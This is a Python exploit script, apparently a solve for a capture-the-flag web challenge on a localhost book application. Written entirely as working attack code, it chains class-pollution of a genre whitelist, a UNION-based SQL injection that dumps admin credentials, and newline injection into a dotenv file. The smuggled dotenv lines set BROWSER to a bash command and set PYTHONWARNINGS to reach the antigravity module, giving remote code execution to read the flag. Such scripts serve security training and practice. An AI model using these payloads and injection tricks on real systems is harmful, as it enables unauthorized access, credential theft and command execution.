import sys
import requests

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:5000'
s = requests.Session()


def step(n, desc):
    print(f'\n[{n}] {desc}')


step(1, 'Prototype pollution — bypass genre whitelist')
sqli_payload = "' UNION SELECT 1,username,password FROM admin-- "
r = s.post(f'{BASE}/api/prefs', json={
    '__class__': {'allowed_genres': [sqli_payload]},
    'genre': sqli_payload,
})
assert r.status_code == 200 and r.json().get('ok'), f'Pollution failed: {r.text}'
print('    ok — allowed_genres polluted')


step(2, 'SQLi — extract admin credentials')
r = s.get(f'{BASE}/books')
rows = r.json()
admin_row = next((row for row in rows if row.get('title') == 'admin'), None)
assert admin_row, f'Admin row not found in: {rows}'
password = admin_row['author']
print(f'    admin / {password}')


step(3, 'Login as admin')
r = s.post(f'{BASE}/login', data={'username': 'admin', 'password': password})
assert r.status_code == 200 and r.json().get('ok'), f'Login failed: {r.text}'
print('    session established')


step(4, 'dotenv injection round 1 — inject BROWSER')
r = s.post(f'{BASE}/admin/backup', data={
    'action': 'save',
    'backup_server': 'a\\',
    'archive_path': "y'\nBROWSER=/bin/bash -c \"cat /flag\" %s\ny",
})
assert r.status_code == 200 and r.json().get('ok'), f'Save r1 failed: {r.text}'
print('    BROWSER injected')


step(5, 'dotenv injection round 2 — inject PYTHONWARNINGS')
r = s.post(f'{BASE}/admin/backup', data={
    'action': 'save',
    'backup_server': 'a\\',
    'archive_path': "y'\nPYTHONWARNINGS=all:0:antigravity.x:0:0\ny",
})
assert r.status_code == 200 and r.json().get('ok'), f'Save r2 failed: {r.text}'
print('    PYTHONWARNINGS injected')


step(6, 'Trigger RCE — run backup')
r = s.post(f'{BASE}/admin/backup', data={'action': 'run'})
assert r.status_code == 200, f'Run failed: {r.text}'
output = r.json().get('output', '')
print(f'    raw output: {output!r}')

flag = next((line for line in output.splitlines() if line.startswith('GCUP{')), None)
if flag:
    print(f'\n=== FLAG: {flag} ===')
else:
    print(f'\n[!] Flag not found in output:\n{output}')
